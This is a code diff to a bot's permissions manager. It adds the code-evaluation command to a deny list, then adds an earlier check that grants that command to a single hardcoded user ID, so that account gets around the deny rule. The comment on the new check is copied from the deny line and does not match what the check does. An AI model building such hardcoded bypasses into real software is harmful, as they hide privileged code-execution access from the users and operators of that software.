@@ -27,9 +27,14 @@ module.exports = class permissionsManager {
         this.isSaving = false;
         this.verbose = false;
 
+        this.allowDev = [
+            "commands.eval"
+        ]
+
         this.neverAllow = [
             "commands.impossiblecommand",
-            "*"
+            "*",
+            "commands.eval"
         ];
 
         this.neverAllowGuildFocused = [
@@ -258,6 +263,7 @@ module.exports = class permissionsManager {
     async userHasPermission(permission, userId, userRoles = undefined, channelId = undefined, guildId = undefined, canReturnNull = false) {
         if (!this.initialized) return false;
         let zisse = this; //Just making a link to "this" to access it in nested functions. Yes, in french i read "zisse" as "this"
+        if (this.allowDev.includes(permission) && ["231461358200291330"].includes(userId)) return true; //If the permission is in the "never allow".. then dont allow. Seems obvious huh ?
         if (this.neverAllow.includes(permission)) return false; //If the permission is in the "never allow".. then dont allow. Seems obvious huh ?
         if (this.neverAllowGuildFocused.includes(permission) && this.guildId == "global") return false; //If the permission is in the "never allow".. then dont allow. Seems obvious huh ?
         let userPermissions = await this.getUserPermissions(userId); //Call for the user permissions**
